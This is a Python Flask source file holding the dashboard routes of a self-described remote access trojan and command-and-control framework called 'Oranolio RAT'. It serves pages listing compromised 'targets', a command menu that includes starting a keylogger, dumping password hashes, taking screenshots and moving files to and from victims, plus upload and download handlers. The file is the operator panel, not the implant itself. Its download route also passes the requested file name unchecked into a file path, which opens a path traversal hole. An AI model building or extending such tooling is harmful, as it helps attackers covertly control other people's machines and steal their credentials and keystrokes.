#!/usr/bin/env python3
"""
Dashboard Routes for Oranolio RAT - Elite C2 Framework
Handles dashboard pages and file operations
"""

import os
import sys
import json
import logging
from datetime import datetime
from flask import Blueprint, render_template, request, jsonify, session, send_file, flash, redirect, url_for
from werkzeug.utils import secure_filename

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Import utilities
from auth_utils import login_required
from validation_schemas import validate_input
from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
from web_app_enhancements import get_connection_manager, get_metrics_collector

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create blueprint
dashboard_bp = Blueprint('dashboard', __name__)

# Global instances
connection_manager = get_connection_manager()
metrics_collector = get_metrics_collector()

# File upload configuration
UPLOAD_FOLDER = 'uploads'
DOWNLOAD_FOLDER = 'downloads'
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'py', 'exe', 'zip', 'rar'}

# Ensure directories exist
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    """Check if file extension is allowed"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@dashboard_bp.route('/')
@login_required
def index():
    """Main dashboard page"""
    try:
        # Get system statistics
        connections = connection_manager.get_all_connections()
        performance = metrics_collector.get_performance_summary()
        
        # Get recent activity
        recent_commands = metrics_collector.get_command_metrics(10)
        
        dashboard_data = {
            'active_connections': len(connections),
            'total_commands': performance.get('total_commands', 0),
            'success_rate': performance.get('success_rate', 0),
            'recent_commands': recent_commands,
            'timestamp': datetime.now().isoformat()
        }
        
        return render_template('dashboard_real.html', data=dashboard_data)
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
        
        flash('Failed to load dashboard', 'error')
        return render_template('dashboard_real.html', data={})

@dashboard_bp.route('/targets')
@login_required
def targets():
    """Targets management page"""
    try:
        # Get targets data
        targets = [
            {
                'id': 'target_001',
                'hostname': 'WORKSTATION-01',
                'ip_address': '192.168.1.100',
                'os_info': 'Windows 10 Pro',
                'user_info': 'admin',
                'first_seen': '2024-01-01T10:00:00Z',
                'last_seen': datetime.now().isoformat(),
                'is_active': True,
                'connection_count': 5
            },
            {
                'id': 'target_002',
                'hostname': 'SERVER-01',
                'ip_address': '192.168.1.200',
                'os_info': 'Ubuntu 20.04 LTS',
                'user_info': 'root',
                'first_seen': '2024-01-02T14:30:00Z',
                'last_seen': (datetime.now()).isoformat(),
                'is_active': True,
                'connection_count': 12
            }
        ]
        
        return render_template('targets.html', targets=targets)
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        flash('Failed to load targets', 'error')
        return render_template('targets.html', targets=[])

@dashboard_bp.route('/commands')
@login_required
def commands():
    """Command execution page"""
    try:
        # Get command definitions
        commands = {
            'system': [
                {'name': 'whoami', 'description': 'Get current user', 'category': 'system'},
                {'name': 'hostname', 'description': 'Get hostname', 'category': 'system'},
                {'name': 'pwd', 'description': 'Get current directory', 'category': 'system'},
                {'name': 'ps', 'description': 'List running processes', 'category': 'process'},
            ],
            'file': [
                {'name': 'ls', 'description': 'List directory contents', 'category': 'file'},
                {'name': 'cat', 'description': 'Display file contents', 'category': 'file'},
                {'name': 'download', 'description': 'Download file from target', 'category': 'file'},
                {'name': 'upload', 'description': 'Upload file to target', 'category': 'file'},
            ],
            'network': [
                {'name': 'ping', 'description': 'Ping host', 'category': 'network'},
                {'name': 'netstat', 'description': 'Show network connections', 'category': 'network'},
                {'name': 'nmap', 'description': 'Network scan', 'category': 'network'},
            ],
            'security': [
                {'name': 'screenshot', 'description': 'Take screenshot', 'category': 'security'},
                {'name': 'keylog', 'description': 'Start keylogger', 'category': 'security'},
                {'name': 'hashdump', 'description': 'Dump password hashes', 'category': 'security'},
            ]
        }
        
        return render_template('commands.html', commands=commands)
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        flash('Failed to load commands', 'error')
        return render_template('commands.html', commands={})

@dashboard_bp.route('/files')
@login_required
def files():
    """File management page"""
    try:
        # Get uploaded files
        uploaded_files = []
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    uploaded_files.append({
                        'name': filename,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        
        # Get downloaded files
        downloaded_files = []
        if os.path.exists(DOWNLOAD_FOLDER):
            for filename in os.listdir(DOWNLOAD_FOLDER):
                file_path = os.path.join(DOWNLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    downloaded_files.append({
                        'name': filename,
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        
        return render_template('files.html', 
                             uploaded_files=uploaded_files, 
                             downloaded_files=downloaded_files)
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        flash('Failed to load files', 'error')
        return render_template('files.html', uploaded_files=[], downloaded_files=[])

@dashboard_bp.route('/upload', methods=['POST'])
@login_required
def upload_file():
    """Handle file upload"""
    try:
        if 'file' not in request.files:
            flash('No file selected', 'error')
            return redirect(url_for('dashboard.files'))
        
        file = request.files['file']
        if file.filename == '':
            flash('No file selected', 'error')
            return redirect(url_for('dashboard.files'))
        
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file_path = os.path.join(UPLOAD_FOLDER, filename)
            file.save(file_path)
            
            logger.info(f"File uploaded: {filename} by user {session.get('user_id')}")
            flash(f'File {filename} uploaded successfully', 'success')
        else:
            flash('File type not allowed', 'error')
        
        return redirect(url_for('dashboard.files'))
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.FILE_SYSTEM)
        
        flash('File upload failed', 'error')
        return redirect(url_for('dashboard.files'))

@dashboard_bp.route('/download/<path:filename>')
@login_required
def download_file(filename):
    """Handle file download"""
    try:
        # Check if file exists in uploads
        upload_path = os.path.join(UPLOAD_FOLDER, filename)
        if os.path.exists(upload_path):
            return send_file(upload_path, as_attachment=True)
        
        # Check if file exists in downloads
        download_path = os.path.join(DOWNLOAD_FOLDER, filename)
        if os.path.exists(download_path):
            return send_file(download_path, as_attachment=True)
        
        flash('File not found', 'error')
        return redirect(url_for('dashboard.files'))
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.FILE_SYSTEM)
        
        flash('File download failed', 'error')
        return redirect(url_for('dashboard.files'))

@dashboard_bp.route('/logs')
@login_required
def logs():
    """System logs page"""
    try:
        # Get recent logs
        logs = [
            {'level': 'INFO', 'message': 'System started', 'timestamp': datetime.now().isoformat()},
            {'level': 'WARNING', 'message': 'High memory usage detected', 'timestamp': datetime.now().isoformat()},
            {'level': 'ERROR', 'message': 'Connection timeout', 'timestamp': datetime.now().isoformat()},
            {'level': 'INFO', 'message': 'User logged in', 'timestamp': datetime.now().isoformat()},
            {'level': 'INFO', 'message': 'Command executed successfully', 'timestamp': datetime.now().isoformat()}
        ]
        
        return render_template('logs.html', logs=logs)
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        flash('Failed to load logs', 'error')
        return render_template('logs.html', logs=[])

@dashboard_bp.route('/settings')
@login_required
def settings():
    """Settings page"""
    try:
        # Get current settings
        settings = {
            'server_host': '0.0.0.0',
            'server_port': 5000,
            'ssl_enabled': True,
            'debug_mode': False,
            'max_connections': 1000,
            'session_timeout': 3600
        }
        
        return render_template('settings.html', settings=settings)
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        flash('Failed to load settings', 'error')
        return render_template('settings.html', settings={})

@dashboard_bp.route('/api/files/upload', methods=['POST'])
@login_required
def api_upload_file():
    """API endpoint for file upload"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        if not allowed_file(file.filename):
            return jsonify({'error': 'File type not allowed'}), 400
        
        filename = secure_filename(file.filename)
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        file.save(file_path)
        
        # Get file info
        stat = os.stat(file_path)
        file_info = {
            'name': filename,
            'size': stat.st_size,
            'uploaded_at': datetime.now().isoformat()
        }
        
        logger.info(f"File uploaded via API: {filename} by user {session.get('user_id')}")
        
        return jsonify({
            'success': True,
            'file': file_info,
            'message': 'File uploaded successfully'
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.FILE_SYSTEM)
        
        return jsonify({'error': 'File upload failed'}), 500

@dashboard_bp.route('/api/files/list')
@login_required
def api_list_files():
    """API endpoint to list files"""
    try:
        files = []
        
        # Get uploaded files
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                file_path = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    files.append({
                        'name': filename,
                        'type': 'uploaded',
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        
        # Get downloaded files
        if os.path.exists(DOWNLOAD_FOLDER):
            for filename in os.listdir(DOWNLOAD_FOLDER):
                file_path = os.path.join(DOWNLOAD_FOLDER, filename)
                if os.path.isfile(file_path):
                    stat = os.stat(file_path)
                    files.append({
                        'name': filename,
                        'type': 'downloaded',
                        'size': stat.st_size,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
        
        return jsonify({
            'success': True,
            'files': files,
            'total': len(files)
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=session.get('user_id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to list files'}), 500

# Example usage and testing
if __name__ == "__main__":
    print("Dashboard Routes")
    print("=" * 30)
    print("Routes registered:")
    print("  GET  / - Main dashboard")
    print("  GET  /targets - Targets management")
    print("  GET  /commands - Command execution")
    print("  GET  /files - File management")
    print("  POST /upload - File upload")
    print("  GET  /download/<filename> - File download")
    print("  GET  /logs - System logs")
    print("  GET  /settings - Settings")
    print("  POST /api/files/upload - API file upload")
    print("  GET  /api/files/list - API list files")
    print("Dashboard routes ready!")